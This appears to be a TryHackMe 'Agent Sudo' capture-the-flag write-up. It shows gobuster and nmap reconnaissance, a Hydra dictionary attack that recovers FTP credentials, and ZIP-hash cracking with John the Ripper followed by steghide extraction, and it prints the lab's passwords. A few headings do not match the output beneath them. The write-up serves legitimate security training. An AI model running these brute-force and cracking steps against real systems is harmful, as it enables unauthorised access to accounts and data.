# 🕵️ TryHackMe – Agent Sudo Challenge

## Path Findings

### See all opened ports in own machine

```bash
sudo lsof -i -P -n | grep LISTEN
```

# Find paths of a route with gobuster

```bash
# Mac
gobuster dir \
 --url http://10.80.129.115/ \
 --wordlist SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
 -x php,txt,html,bak,zip,old

# Downloaded from git clone https://github.com/danielmiessler/SecLists.git

#Alternative (Linux)
dirb
```

Example output:

```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.80.129.115/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
index.php            (Status: 200) [Size: 218]
server-status        (Status: 403) [Size: 278]
Progress: 4751 / 4751 (100.00%)
===============================================================
Finished
===============================================================
```

# Search server for open ports with nmap

```bash
nmap 10.80.186.244
```

Example output:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 18:36 CET
Nmap scan report for 10.80.186.244
Host is up (0.037s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT STATE SERVICE
21/tcp open ftp
22/tcp open ssh
80/tcp open http

Nmap done: 1 IP address (1 host up) scanned in 7.70 seconds
```

# Dictionary Attack with Hydra

Hydra is a tool for dictionary attacks.
It has a really good CLI, with support to multithreading, finish conditions, lists of users and passwords, internet protocols, etc...

```
hydra -l chris -P rockyou.txt ftp://10.80.186.244 -t 4 -V -f
```

-L -> all logins in files
-P → Password Wordlist
-t → Number of Threads
-V → Verbose Mode
-vV -> Very Verbose
-f -> stop on first success

Example Output

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-14 19:29:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.80.186.244:21/
[21][ftp] host: 10.80.186.244   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-14 19:30:31
```

## File Analysis & Steganography Walkthrough

---

# 1️⃣ Identify File Type

Always start by checking what kind of file you’re dealing with:

```bash
file image.jpg
```

This tells you whether the file is really what it claims to be.

Example outputs:

```
-> file a-alien.png
a-alien.png: PNG image data, 528 x 528, 8-bit colormap, non-interlaced


-> file the-alien.jpg
the-alien.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 440x501, components 3
```

---

# 2️⃣ Inspect Readable Strings

```bash
strings image.jpg
```

### What does `strings` do?

The `strings` command:

- Scans a binary file
- Extracts human-readable text
- Looks for printable character sequences (default: 4+ characters)

Even binary files like:

- `.jpg`
- `.png`
- `.exe`
- `.pdf`

can contain:

- Hidden messages
- Metadata
- Filenames
- Hardcoded passwords
- Embedded file names
- URLs

`strings` helps reveal that information.

---

## 🔎 Example Output (a-alien.png)

```bash
strings a-alien.png
```

Near the end of the output:

```
[image bits]
IEND
To_agentR.txt
W\_z#
2a>=
To_agentR.txt
EwwT
```

### Important Observation:

`IEND` marks the end of a PNG file.

Nothing should normally come after `IEND`.

If readable data appears after `IEND`, it means:

> 🚨 There is appended (hidden) data inside the file.

---

# 3️⃣ Check Metadata with ExifTool

```bash
exiftool the-alien.jpg
```

### What does `exiftool` do?

It extracts metadata embedded inside files.

For images like JPEGs, it can reveal:

- Camera model
- Date taken
- GPS coordinates
- Author
- Software used
- Comments
- Hidden text fields

In CTFs, metadata often contains:

- Passwords
- Hints
- Usernames
- Encoded strings

---

### Result (a-alien.png)

Example output:

```
-> exiftool the-alien.jpg

ExifTool Version Number         : 13.50
File Name                       : the-alien.jpg
Directory                       : .
File Size                       : 33 kB
File Modification Date/Time     : 2026:02:14 19:59:41+01:00
File Access Date/Time           : 2026:02:14 20:57:55+01:00
File Inode Change Date/Time     : 2026:02:14 19:59:41+01:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Image Width                     : 440
Image Height                    : 501
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 440x501
Megapixels                      : 0.220
```

```bash
Warning : [minor] Trailer data after PNG IEND chunk
```

This confirms:

> There is hidden data appended after the PNG image.

---

# 4️⃣ Find the Exact End of the PNG

Find where `IEND` occurs:

```bash
strings -t d a-alien.png | grep IEND
```

Output:

```
34554 IEND
```

The PNG truly ends at byte:

```
34554 + 8 bytes (IEND chunk size)
= 34562
```

---

# 5️⃣ Extract Appended Data

```bash
dd if=a-alien.png of=real.zip bs=1 skip=34562
```

Check file type:

```bash
file real.zip
```

Output:

```
Zip archive data, compression method=AES Encrypted
```

---

# 6️⃣ Crack the ZIP with John the Ripper (John)

## Why Not Just Use 7z Brute Force?

Because AES-encrypted ZIP files are slow to brute force manually.

Better approach:

1. Extract hash
2. Crack hash with John
3. Use cracked password

This is more efficient because:

- No repeated file extraction
- Less disk I/O
- Parallelized cracking

---

# 7️⃣ Use Docker (Clean Environment)

Instead of fighting macOS tool issues:

```bash
docker run -it --rm -v $(pwd):/data kalilinux/kali-rolling bash
```

Inside container:

```bash
apt update
apt install john
cd /data
```

---

# 8️⃣ Extract ZIP Hash

```bash
zip2john real.zip > zip.hash
```

`zip2john` extracts:

- Hash
- Salt
- Metadata

---

# 9️⃣ Crack the Hash

```bash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Output:

```
alien (real.zip/To_agentR.txt)
```

### ✅ ZIP Password:

```
alien
```

---

# 🔓 Extract ZIP

```bash
7z x real.zip -palien
```

This extracts:

```
To_agentR.txt
```

---

# 🔐 Steganography in JPG

Next step:

```bash
sudo port install steghide
steghide extract -sf the-alien.jpg
```

Password:

```
Area51
```

---

# 🧠 Key Learnings

### 1️⃣ Always Check for Appended Data

PNG files should end at `IEND`.
Anything after that is suspicious.

---

### 2️⃣ Use `strings` Early

Quick way to detect:

- Hidden filenames
- Suspicious patterns
- Embedded data

---

### 3️⃣ Metadata Matters

`exiftool` can reveal:

- Hidden clues
- Suspicious fields
- File manipulation hints

---

### 4️⃣ Don’t Brute Force Blindly

When cracking encrypted files:

- Extract hash
- Use proper cracking tools (John)
- Avoid inefficient brute force via extraction attempts

---

### 5️⃣ Linux-Based Tools Are Easier for CTFs

macOS causes dependency issues.

Using:

- Kali Linux
- Docker containers
- TryHackMe AttackBox

saves a lot of time.

---

# 🔄 Full Attack Chain

```
a-alien.png
→ Hidden appended ZIP
→ AES encrypted
→ Extract hash
→ Crack with John
→ Password: alien
→ Extract To_agentR.txt
→ Steghide on the-alien.jpg
→ Password: Area51
```
